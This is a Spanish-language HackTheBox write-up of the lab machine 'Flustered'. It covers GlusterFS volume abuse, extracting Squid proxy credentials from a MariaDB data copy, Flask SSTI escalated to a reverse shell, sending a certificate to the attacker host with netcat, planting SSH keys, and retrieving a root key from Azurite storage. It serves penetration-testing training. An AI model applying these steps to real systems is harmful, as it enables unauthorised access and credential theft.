---
title: HTB - Flustered
published: true
categories: [Linux]
tags: [eJPT, eWPT, eWPTXv2, eCPPTv2, OSWE, OSCP, Media]
---


<img src="/assets/HTB/Flustered/flustered.png">


¡Hola!
Vamos a resolver de la máquina `Flustered` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Abusing Squid Proxy**
- **Abusing GlusterFS**
- **Information Leakage**
- **Server Side Template Injection (SSTI)[RCE]**
- **Abusing Azure Storage**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Flustered`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.131
PING 10.10.11.131 (10.10.11.131) 56(84) bytes of data.
64 bytes from 10.10.11.131: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.11.131 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.131 -oG allPorts

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63
3128/tcp  open  squid-http syn-ack ttl 63
24007/tcp open  unknown    syn-ack ttl 63
49152/tcp open  unknown    syn-ack ttl 63
49153/tcp open  unknown    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```java
nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN targeted

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-title: steampunk-era.htb - Coming Soon
|_http-server-header: nginx/1.14.2
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos `flustered.htb` y `steampunk-era.htb` a nuestro `/etc/hosts`

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```shell
❯ whatweb http://steampunk-era.htb
http://steampunk-era.htb/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.11.131], Title[steampunk-era.htb - Coming Soon], nginx[1.14.2]
```

### Puerto 24007

* * *

Nos llama la atención el puerto 24007. Buscando en Google qué servicios pueden estar corriendo bajo este puerto encontramos `Gluster FS`. **GlusterFS** es un sistema de archivos distribuido y escalable a cualquier nivel que reúne las unidades de almacenamiento de diferentes servidores en un solo sistema.

Nos instalamos las herramientas `gluster-client` y `gluster-server`. Consultamos los volúmenes disponibles

```bash
❯ gluster --remote-host=10.10.11.131 volume list
vol1
vol2
```
Tratamos de montar el `vol1` pero nos da error. Revisamos log y detectamos error

```bash
❯ mount -t glusterfs 10.10.11.131:/vol1 /mnt/flustered
Mount failed. Check the log file  for more details.

❯ cat /var/log/glusterfs/mnt-flustered.log
.
.
.
[2022-12-13 09:27:57.185649 +0000] E [name.c:267:af_inet_client_get_remote_sockaddr] 0-vol2-client-0: DNS resolution failed on host flustered
.
.
.
```
Agregamos `flustered` a nuestro `/etc/hosts` y probamos de nuevo. Nos sale otra vez error y comprobamos en el log que esta vez es problema de certificado

```bash
❯ mount -t glusterfs 10.10.11.131:/vol1 /mnt/flustered
Mount failed. Check the log file  for more details.

❯ cat /var/log/glusterfs/mnt-flustered.log
.
.
.
[2022-12-13 09:27:57.185649 +0000] E [name.c:267:af_inet_client_get_remote_sockaddr] 0-vol2-client-0: DNS resolution failed on host flustered
.
.
.
```

Probamos a montar el vol2 y nos los permite

```bash
❯ mount -t glusterfs 10.10.11.131:/vol2 /mnt/flustered
❯ ls -l /mnt/flustered
drwx------ debian-tor Debian-exim 4.0 KB Mon Oct 25 14:43:33 2021  mysql
drwx------ debian-tor Debian-exim 4.0 KB Mon Oct 25 14:43:33 2021  performance_schema
drwx------ debian-tor Debian-exim 4.0 KB Mon Oct 25 14:44:06 2021  squid
.rw-rw---- debian-tor Debian-exim  16 KB Mon Oct 25 14:52:59 2021  aria_log.00000001
.rw-rw---- debian-tor Debian-exim  52 B  Mon Oct 25 14:52:59 2021  aria_log_control
.rw-r--r-- root       root          0 B  Mon Oct 25 14:43:25 2021  debian-10.3.flag
.rw-rw---- debian-tor Debian-exim 998 B  Fri Jan 28 13:28:08 2022  ib_buffer_pool
.rw-rw---- debian-tor Debian-exim  48 MB Mon Oct 25 14:52:58 2021  ib_logfile0
.rw-rw---- debian-tor Debian-exim  48 MB Mon Oct 25 14:37:55 2021  ib_logfile1
.rw-rw---- debian-tor Debian-exim  12 MB Mon Oct 25 14:52:58 2021  ibdata1
.rw-rw---- debian-tor Debian-exim  12 MB Tue Dec 13 09:37:31 2022  ibtmp1
.rw-rw---- debian-tor Debian-exim   0 B  Mon Oct 25 14:43:31 2021  multi-master.info
.rw-rw---- root       root         16 B  Mon Oct 25 14:43:33 2021  mysql_upgrade_info
.rw-rw---- debian-tor Debian-exim  24 KB Tue Dec 13 09:37:30 2022  tc.log
```

Mediante la herramienta `strings` podemos ver la versión de `MariaDB` que tenemos en la montura

```bash
❯ strings mysql_upgrade_info
10.3.31-MariaDB
```
Observamos que es una versión un poco antigua por lo que vamos a jugar con contenedores para instalar una versión idéntica de MariaDB en nuestro equipo y a su vez incluiremos todos los directorios de la montura del vol2 en el contenedor que vamos a desplegar, así podremos listar su contenido. Primero creamos un directorio `/tmp/mysql`. Copiamos todo el contenido de `/mnt/flustered/` en el directorio creado. Finalmente creamos el contenedor de nombre `mariadb` y le indicamos que todo lo que haya en `/tmp/mysql` lo monte en el direcotorio del contenedor `/var/lib/mysql`, como último parámetro le indicamos la versión exacta que queremos de mariadb

```bash
❯ cp -R /mnt/flustered/* .
❯ docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
Unable to find image 'mariadb:10.3.31' locally
10.3.31: Pulling from library/mariadb
7b1a6ab2e44d: Pull complete 
034655750c88: Pull complete 
f0b757a2a0f0: Pull complete 
5c37daf8b6b5: Pull complete 
b4cd9409b0f6: Pull complete 
dbcda06785eb: Pull complete 
a34cd90f184c: Pull complete 
55c0df9b2fca: Pull complete 
e2a4d476ce21: Pull complete 
6592280ea514: Pull complete 
0ede5dfe32b4: Pull complete 
Digest: sha256:22834b9671a1e89b74e0cc0bc285fd33425ba2641afe86cb3afd5d8617245b81
Status: Downloaded newer image for mariadb:10.3.31
4ad661c91cca8676cdce13bfad59c68bbd1dfceec2732ce53e4d2c2f1cee55c1
```

Ya tenemos nuestro contenedor en marcha

```bash
❯ docker images
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
mariadb      10.3.31   439df5ac9582   14 months ago   386MB

❯ docker ps
CONTAINER ID   IMAGE             COMMAND                  CREATED              STATUS              PORTS      NAMES
4ad661c91cca   mariadb:10.3.31   "docker-entrypoint.s…"   About a minute ago   Up About a minute   3306/tcp   mariadb

❯ docker exec -it mariadb bash
root@4ad661c91cca:/# whoami
root
```

Tratando de conectarnos al servicio mysql del contenedor nos salta un error

```bash
❯ docker exec -it mariadb mysql
ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded
```

Una búsqueda en Google del error nos da la solución. Primero de todo creamos en `/tmp` un archivo `socket.cnf` con el siguiente contenido

```bash
[mariadb]
plugin-load-add = auth_socket.so
```

Posteriormente hacemos rebuild del contenedor de docker pero esta vez incluyendo el archivo creado y depositándolo en `/etc/mysql/mariadb.conf.d/`

```bash
❯ docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -v /tmp/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf -d mariadb:10.3.31
```

una vez desplegado el nuevo contenedor con el archivo creado ya podemos acceder al servicio mysql

```bash
❯ docker exec -it mariadb mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.3.31-MariaDB-1:10.3.31+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Comenzamos la enumeración de bases de datos y econtramos una que se llama `squid`. Recordemos del reconocimento de puertos abiertos que tenemos el puerto 3128 abierto el cual tiene un `Squid proxy`. Listando tablas de la base de datos logramos unas credenciales para este servicio

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| squid              |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]> use squid;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [squid]> show tables;
+-----------------+
| Tables_in_squid |
+-----------------+
| passwd          |
+-----------------+
1 row in set (0.000 sec)

MariaDB [squid]> select * from passwd;
+----------------+---------------+---------+----------------+---------+
| user           | password      | enabled | fullname       | comment |
+----------------+---------------+---------+----------------+---------+
| lance.friedman | o>WJ5-jD<5^m3 |       1 | Lance Friedman |         |
+----------------+---------------+---------+----------------+---------+
1 row in set (0.001 sec)
```

### Puerto 3128

* * *

Procedemos a verificar las credenciales obtenidas

```bash
❯ curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' http://127.0.0.1
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

Ahora que tenemos acceso al squid proxy procedemos a enumerar directorios con `gobuster`. Hay que tener en en cuenta que la contraseña tiene caracteres especiales que nos pueden dar problemas. Cambiamos `>` por `%3E`, `<` por `%3C` y `^` por `%5E`

```bash
❯ gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://127.0.0.1
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/12/13 11:43:02 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 301) [Size: 185] [--> http://127.0.0.1/app/]
```

Descubrimos directorio `app`. Fuzzeamos nuevamente a raíz del directorio `/app` y con extensiones `.py`

```bash
❯ gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1/app
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              py
[+] Timeout:                 10s
===============================================================
2022/12/13 11:47:54 Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 185] [--> http://127.0.0.1/app/templates/]
/static               (Status: 301) [Size: 185] [--> http://127.0.0.1/app/static/]   
/app.py               (Status: 200) [Size: 748]                                      
/config               (Status: 301) [Size: 185] [--> http://127.0.0.1/app/config/]   
```

Listamos conetenido de `/app/app.py`

```bash
❯ curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' http://127.0.0.1/app/app.py
from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()
```

Analizando el archivo en python podemos ver que se trata de la página web que se nos muestra al visitar el servicio http en el puerto 80. Nos percatamos en la etiqueta el contenido de la etiqueta title recibe el valor de la variable `config`

```html
<title>{getsiteurl(config)} - Coming Soon</title>
```
Comprobamos que podemos controlar el contenido de esta variable

```bash
❯ curl -s -X POST "http://10.10.11.131" -H "Content-type: application/json" -d '{"siteurl": "prueba"}'

    <html>
    <head>
    <title>prueba - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
```

En el contenido del archivo `app.py` vemos en la cabecera `flask` por lo que enseguida se nos viene a la cabeza la posibiliad de un SSTI. Comprobamos que sea vulnerable

```bash
❯ curl -s -X POST "http://10.10.11.131" -H "Content-type: application/json" -d '{"siteurl": "{ { 7*7 } }"}'

    <html>
    <head>
    <title>49 - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
```

Como sabemos que tenemos capacidad de SSTI vamos a tratar de derivarlo a RCE. Buscamos en `PayloadAllThe Things` y localizamos un payload el cual nos puede ejecutar un ping

<img src="/assets/HTB/Flustered/rce.png">

Repetimos payload pero esta vez haremos un `curl` a nuestra dirección en donde tendremos un servidor http por el puerto 80 donde serviremos un archivo `index.html` el cual contiene un oneliner para entablar una reverse shell. Nos ponemos en escucha en el puerto 443 y ejecutamos

<img src="/assets/HTB/Flustered/revshell.png">

### Movimiento Lateral

* * *

Nos econtramos logueados con el usuario `www-data` y enumerando permisos y privilegios poco podemos hacer. Recordamos que no pudimos montar el `vol1` de gluster por falta de certificado en `/etc/ssl`. Ya que nos encontramos dentro de la máquina víctima podemos descargarnos esos certificados en nuestro equipo EN `/usr/lib/ssl` y así poder montar el `vol1`

```bash
# MAQUINA VICTIMA
www-data@flustered:/etc/ssl$ nc 10.10.14.34 443 < glusterfs.ca

# MAQUINA ATACANTE
❯ nc -nlvp 443 > glusterfs.ca
listening on [any] 443 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.131] 46126
```

Montamos el `vol1` esta vez sin problemas y accediendo a la montura observamos que nos econtramos dentro del directorio personal de `jennifer`

```bash
❯ ls -la
drwxr-x--- yorch lpadmin 4.0 KB Mon Oct 25 07:49:56 2021  .
drwxr-xr-x root  root     18 B  Tue Dec 13 10:27:10 2022  ..
drwx------ yorch lpadmin 4.0 KB Mon Oct 25 07:44:58 2021  .gnupg
drwx------ yorch lpadmin 4.0 KB Tue Dec  7 20:54:21 2021  .ssh
lrwxrwxrwx yorch lpadmin   9 B  Thu Oct 28 08:59:15 2021  .bash_history ⇒ /dev/null
.rw-r--r-- yorch lpadmin 220 B  Mon Sep 20 14:27:59 2021  .bash_logout
.rw-r--r-- yorch lpadmin 3.4 KB Mon Sep 20 14:27:59 2021  .bashrc
.rw-r--r-- yorch lpadmin 807 B  Mon Sep 20 14:27:59 2021  .profile
.r-------- yorch lpadmin  33 B  Tue Dec 13 09:38:14 2022  user.txt
```

Como tenemos acceso a su directorio `.ssh` podemos crearnos un par de claves en nuestro equipo y depositar la clave `id_rsa.pub` en el directorio `\mnt\flustered\.ssh` como `authorized_keys`. Con esto podemos loguearnos como jennifer desde nuestro equipo sin proporcionar ninguna clave

```bash
❯ ssh jennifer@10.10.11.131
The authenticity of host  10.10.11.131 (10.10.11.131)' can't be established.
ECDSA key fingerprint is SHA256:LupmIqJooENvHtcmU6o+VGqBueq8vhR9BU0BbTYQ52E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.131' (ECDSA) to the list of known hosts.
Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jennifer@flustered:~$ whoami
jennifer
```

La clave de usuario la encontramos en su directorio personal

```bash
jennifer@flustered:~$ cat user.txt 
e69a6b6bebde9a492***************
```

### Escalada Privilegios

* * *

El directorio `/var/backups` contiene un archivo `key` que se puede leer por el grupo `jennifer`

```bash
jennifer@flustered:~$ ls -l /var/backups/key 
-rw-r----- 2 root jennifer 89 Oct 26  2021 /var/backups/key
```

El archivo contiene datos encriptados en `base64`

```bash
jennifer@flustered:~$ cat /var/backups/key 
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
```
El comando `ip a` nos muestra que hay una interfaz en Docker con la IP 172.17.0.1

```bash
jennifer@flustered:~$ ip a
.
.
.
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:bf:9b:73:6e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:bfff:fe9b:736e/64 scope link 
       valid_lft forever preferred_lft forever
.
.
.
```

Descubrimos un contenedor con IP 172.17.0.2

```bash
jennifer@flustered:~$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.136 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.136/0.136/0.136/0.000 ms
```

Usamos SSH dynamic port forwarding para ejecutar `nmap`

```bash
❯ ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 13 11:48:43 2022 from 10.10.14.34
```

```bash
❯ nmap -sCV -p10000 127.0.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-13 13:14 CET
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.31% done; ETC: 13:15 (0:00:00 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000059s latency).

PORT      STATE SERVICE           VERSION
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Server: Azurite-Blob/3.14.3
|     Date: Tue, 13 Dec 2022 12:15:05 GMT
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Server: Azurite-Blob/3.14.3
|     Date: Tue, 13 Dec 2022 12:14:59 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 A required CORS header is not present.
|     Server: Azurite-Blob/3.14.3
|     x-ms-error-code: InvalidHeaderValue
|     x-ms-request-id: 1ecda9fa-7e29-4f18-ad21-6b129998e0a9
|     content-type: application/xml
|     Date: Tue, 13 Dec 2022 12:14:59 GMT
|     Connection: close
|     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
|     <Error>
|     <Code>InvalidHeaderValue</Code>
|     <Message>A required CORS header is not present.
|     RequestId:1ecda9fa-7e29-4f18-ad21-6b129998e0a9
|     Time:2022-12-13T12:14:59.950Z</Message>
|     <MessageDetails>Invalid required CORS header Origin undefined</MessageDetails>
|_    </Error>
```

Observando el resultado del escaneo por nmap vemos que por el puerto 10000 está corriendo [Azurite](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azurite?tabs=visual-studio). Para pode interactuar con Azure Storage necesitamos descargar [Azure Storage Explorer](https://www.addictivetips.com/ubuntu-linux-tips/install-the-microsoft-azure-storage-explorer-on-linux/). Lo instalamos y ejecutamos con `bash` para evitar errores con zsh. Recomiendo la versión 1.22.1 

Primero debemos agregar `Local storage emulator`

<img src="/assets/HTB/Flustered/menu.png">

Posteriormente configuramos según captura

<img src="/assets/HTB/Flustered/azure.png">

Con la nueva conexión configurada veremos dos contenedores `Blob`

<img src="/assets/HTB/Flustered/blob.png">

Accedemos a la carpeta ssh-keys y localizamos la clave privada de root

<img src="/assets/HTB/Flustered/rootkey.png">

Nos descargamos el archivo, le otorgamos privilegios 600 y ya podemos conectarnos como root por ssh. La flag la tenemos en el directorio `/root`

```bash
root@flustered:~# cat /root/root.txt 
b8e81a3d28acdc644***************
```

Hemos completado la máquina **Flustered** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Flustered/pwned.png">